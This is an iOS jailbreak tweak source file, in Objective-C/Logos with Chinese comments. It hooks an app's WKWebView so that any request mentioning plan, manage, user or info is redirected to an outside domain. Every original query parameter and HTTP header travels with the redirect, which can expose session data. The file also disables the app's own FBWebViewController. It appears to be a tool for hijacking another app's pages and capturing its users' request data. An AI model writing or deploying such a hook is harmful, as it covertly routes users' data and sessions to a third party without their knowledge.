#import <UIKit/UIKit.h>
#import <WebKit/WebKit.h>

%config(generator=internal)

// ==============================================
// 核心：拦截原APP的网页请求，保留所有参数，只替换域名
// ==============================================
%hook WKWebView
- (void)loadRequest:(NSURLRequest *)request {
    NSURL *originalURL = request.URL;
    NSString *urlString = originalURL.absoluteString;
    
    // 只要是 Plan Manage 相关的请求，就替换成你的链接，但保留参数
    if ([urlString containsString:@"plan"] || [urlString containsString:@"manage"] ||
        [urlString containsString:@"user"] || [urlString containsString:@"info"]) {
        
        // 拆分参数
        NSArray *parts = [urlString componentsSeparatedByString:@"?"];
        NSString *newURLString = @"https://h5.896789.top/#/entryCenter?";
        
        // 保留原有的所有参数！！！
        if (parts.count > 1) {
            newURLString = [newURLString stringByAppendingString:parts[1]];
        }
        
        NSURL *newURL = [NSURL URLWithString:newURLString];
        NSMutableURLRequest *newRequest = [NSMutableURLRequest requestWithURL:newURL];
        newRequest.allHTTPHeaderFields = request.allHTTPHeaderFields;
        
        // 加载你的链接 + 原参数
        %orig(newRequest);
        return;
    }
    
    // 其他请求正常放行
    %orig;
}
%end

// ==============================================
// 拦截APP自己的WebView创建，防止重复弹窗
// ==============================================
%hook FBWebViewController
- (id)initWithURL:(id)url {
    return nil;
}
%end

// ==============================================
// 不拦截点击！让APP自己生成参数！
// 只替换最终打开的网址！
// ==============================================